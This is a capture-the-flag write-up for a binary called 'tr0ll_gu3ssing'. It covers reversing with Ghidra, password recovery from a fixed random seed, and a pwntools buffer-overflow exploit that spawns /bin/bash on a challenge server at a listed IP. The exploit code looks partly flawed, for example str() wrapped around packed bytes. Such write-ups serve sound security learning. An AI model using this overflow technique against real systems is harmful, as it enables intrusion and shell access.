### Playing with the binary

```
$ file tr0ll_gu3ssing

```
When we execute the binary locally, it keeps asking for a password
```
$ ./tr0ll_gu3ssing
Can you guess the password : password
Wrong !
Can you guess the password : ^C
```
So I opened the binary in Ghidra and I found that the main() function calls rand_str() function in a while loop which generates<br>
31 random numbers and uses them to construct a 31 bytes long password and waits for input, if we can guess the random password<br>
it will execute system("/bin/cat flag.txt") and give us the flag. At first glance I noticed that the srand() function is  using<br>
a constant as a seed, which means the random numbers will be repeated for every execution of the program and the passwords too<br>
```C
undefined8 main(void)

{
  int iVar1;
  char local_48 [32];
  undefined8 local_28;
  undefined8 local_20;
  undefined8 local_18;
  undefined8 local_10;
  
  local_28 = 0x7461632f6e69622f;	//These lines represent
  local_20 = 0x78742e67616c6620;	//the string "/bin/cat flag.txt"
  local_18 = 0x74;			//
  local_10 = 0;				//
  setup();
  srand(0xfedcba98);  			// <== the srand seed is a constant
  while( true ) {
     rand_str(password,0x1f);
     printf("Can you guess the password : ");
     __isoc99_scanf(&DAT_00400ab6,local_48);
     iVar1 = strcmp(local_48,password);
     if (iVar1 == 0) break;
     puts("Wrong !");
  }
  system((char *)&local_28);		//This lines executes "/bin/cat flag.txt"
  return 0;
}
```
So I executed the program with ltrace to copy the password, than executed the program again to enter the password
```
$ ltrace ./tr0ll_gu3ssing

Cool! Now let's try it in the remote host
```
$ nc 3.91.133.232 4001
Can you guess the password : pgFAg3m50ZnhgCVu11oihVKpTpb28UU
We've been tricked, we've been backstabbed and we've been quite possibly, bambooozled.
```
It seems that the flag.txt file was just a trap, this is a pwn challenge afterall, and all we did until now is reversing<br>
so let's try something different, notice that the main() function uses scanf() for input, and there is no length check!<br>
We have a buffer-overflow with no stack-canary and with PIE disabled, so let's write an exploit:<br>
### Exploit
1_ overwrite the return address with system() gadget address.<br>
2_ overwrite the "/bin/cat flag.txt" string with "/bin/bash\0".<br>
3_ enter the right password for the 3rd iteration to break the loop and get a shell.<br>
```python3
#!/usr/bin/env python3

from pwn import *

log.info(ELF("./tr0ll_gu3ssing").checksec())

io = remote('3.91.133.232', 4001)

system_gadget = p32(0x400870)

log.info('Overwriting the return address with system() gadget address')
io.sendline('A'*0x48 + str(system_gadget))

log.info('Overwriting the string "/bin/cat flag.txt" with "/bin/bash\0"')
io.sendline('A'*0x20 + '/bin/bash')

log.info('Sending the 3rd password to break the loop')
io.sendline('IQ0RiDmPhQKcCi4RSXvK75mHxor2y6t')

io.interactive()
io.close()
```
